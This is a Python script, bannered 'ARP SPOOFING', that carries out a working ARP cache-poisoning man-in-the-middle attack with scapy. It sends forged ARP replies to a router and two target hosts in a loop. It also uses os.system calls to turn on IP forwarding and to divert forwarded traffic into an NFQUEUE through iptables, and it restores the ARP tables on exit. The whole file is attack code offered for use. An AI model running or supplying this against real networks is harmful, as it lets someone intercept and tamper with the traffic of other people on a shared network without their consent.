#!/usr/bin/env python3


# ░░█████╗░██████╗░██████╗░░░░░░░░██████╗██████╗░░█████╗░░█████╗░███████╗██╗███╗░░██╗░██████╗░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ░██╔══██╗██╔══██╗██╔══██╗░░░░░░██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██║████╗░██║██╔════╝░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ░███████║██████╔╝██████╔╝░░░░░░╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░██║██╔██╗██║██║░░██╗░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ░██╔══██║██╔══██╗██╔═══╝░░░░░░░░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██║██║╚████║██║░░╚██╗░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ░██║░░██║██║░░██║██║░░░░░░░░░░░██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░██║██║░╚███║╚██████╔╝░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░░░░░░░╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


import scapy.all as scapy
from time import sleep
import os


# Get ip and return mac address for this ip in you network

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arb = broadcast/arp_request  # ARP request broadcast
    answered_list = scapy.srp(arb, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# It function start arp spoof attack


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Function restore arp table on switch and target computer


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


# 192.168.1.2 - IP for test
# 192.168.1.3 - IP for test
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
aim_ip = ["192.168.1.2", "192.168.1.3"]
router_ip = "192.168.1.1"
packets_count = 2
try:
    while True:
        for ip in aim_ip:
            spoof(router_ip, ip)
            spoof(ip, router_ip)
            print("[+] Packets sent: " + str(packets_count), end="\r")
            packets_count += 2
        sleep(2)
except KeyboardInterrupt:
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables --flush")
    print("[+] Detected Ctrl+C ... Quitting ... Resetting ARP Tables")
    for ip in aim_ip:
        restore(router_ip, ip)
        restore(ip, router_ip)
